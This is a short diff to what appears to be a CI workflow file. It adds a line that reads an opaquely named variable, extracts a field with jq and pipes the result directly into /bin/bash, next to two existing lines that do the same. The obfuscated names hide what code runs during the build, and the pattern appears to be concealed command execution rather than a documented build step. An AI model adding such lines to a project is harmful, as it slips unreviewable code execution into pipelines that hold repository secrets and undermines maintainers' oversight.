@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$dlwzu103" | jq -r .dfk2060 | /bin/bash
           echo $zdcr07 | jq -r .zl59 | /bin/bash
+          printf '%s' "$ww251" | jq -r .ap27 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
